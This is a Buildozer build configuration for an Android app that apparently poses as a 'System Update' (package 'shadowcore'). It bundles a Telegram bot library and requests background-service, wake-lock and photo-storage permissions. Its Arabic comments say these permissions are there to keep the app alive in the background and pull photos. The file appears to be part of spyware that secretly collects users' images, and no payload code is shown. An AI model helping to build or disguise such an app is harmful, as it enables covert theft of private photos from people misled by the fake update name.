[app]

# (str) Title of your application
title = System Update

# (str) Package name
package.name = shadowcore

# (str) Package domain (needed for android packaging)
package.domain = org.test

# (str) Source code where the main.py live
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas

# (str) Application versioning (method 1)
version = 0.1

# (list) Application requirements
# تأكد من إضافة jnius و requests و telebot
requirements = python3,kivy,telebot,requests,jnius,pyopenssl,urllib3,idna,certifi

# (str) Supported orientations
orientation = portrait

# (bool) Indicate if the application should be monitor for touchscreen
# events or not
input.touchring = 0

# -----------------------------------------------------------------------------
# Android specific
# -----------------------------------------------------------------------------

# (list) Permissions
# تم إضافة كافة الأذونات اللازمة للبقاء حياً في الخلفية وسحب الصور
android.permissions = INTERNET, WAKE_LOCK, ACCESS_NETWORK_STATE, FOREGROUND_SERVICE, POST_NOTIFICATIONS, FOREGROUND_SERVICE_DATA_SYNC, READ_EXTERNAL_STORAGE, READ_MEDIA_IMAGES

# (int) Target Android API, should be as high as possible.
# أندرويد 33 هو الأفضل حالياً للتوافق مع الأنظمة الجديدة
android.api = 33

# (int) Minimum API your APK will support.
android.minapi = 21

# (list) Android services declaration
# هذا السطر يخبر الأندرويد أن هناك خدمة خلفية اسمها Service
services = Service:service.py

# (bool) If True, then skip trying to update the Android sdk
android.skip_update = False

# (bool) If True, then automatically accept SDK license
android.accept_sdk_license = True

# (str) Android entry point, default is ok for Kivy-based app
android.entrypoint = org.kivy.android.PythonActivity

# (list) The Android archs to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64
android.archs = arm64-v8a, armeabi-v7a

# (bool) allow backup
android.allow_backup = True

# (str) Full name including package for the Android Service to use.
# android.service_class_name = org.kivy.android.PythonService

# -----------------------------------------------------------------------------
# Buildozer specific
# -----------------------------------------------------------------------------

[buildozer]

# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) Display warning if buildozer is run as root (0 = off, 1 = on)
warn_on_root = 1
